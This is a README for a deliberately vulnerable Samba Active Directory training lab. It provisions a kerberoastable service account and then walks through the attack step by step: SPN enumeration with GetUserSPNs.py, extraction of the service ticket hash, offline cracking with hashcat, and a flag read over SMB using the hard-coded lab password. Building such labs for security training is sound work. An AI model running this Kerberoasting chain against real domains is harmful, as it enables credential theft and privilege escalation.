# Kerberoasting (Active Directory)

A single-container Active Directory lab built with [Isoloom](https://www.isoloom.com):
[`isoloom.yml`](isoloom.yml) describes one Samba Domain Controller for the realm
**NORTH.SEVENKINGDOMS.LOCAL** — no Windows VMs. It provisions a low-privilege foothold user
(`hodor`), a kerberoastable service account (`svc_sql`, with an MSSQL SPN and a weak RC4 key),
and a `vault` share only `svc_sql` may read.

| Machine | Service |
| --- | --- |
| dc | Samba AD DC: DNS 53, Kerberos 88, LDAP 389/636, SMB 445, kpasswd 464, GC 3268 |

## The attack

1. From `hodor` / `Hodor123!`, enumerate SPNs:
   `GetUserSPNs.py -dc-ip <dc> NORTH.SEVENKINGDOMS.LOCAL/hodor:'Hodor123!'` → `svc_sql`,
   SPN `MSSQLSvc/dc.north.sevenkingdoms.local:1433`.
2. Request and extract the service ticket (native MIT client against the Samba KDC):
   `kinit hodor`, `kvno MSSQLSvc/dc.north.sevenkingdoms.local:1433`, then pull the
   `$krb5tgs$23$...` hash from your credential cache.
3. Crack it offline: `hashcat -m 13100 tgs.hash rockyou.txt`.
4. Read the flag: `smbclient //dc/vault -U 'NORTH\svc_sql%<cracked>' -c 'get flag.txt'`.

## Run it

```bash
isoloom generate
isothrum up . --target docker
isothrum check . --target docker
isothrum down . --target docker
```

The same spec also runs on a local VM, a cloud VM, or Kubernetes targets that Isoloom supports.
This environment is deliberately vulnerable: keep it isolated.
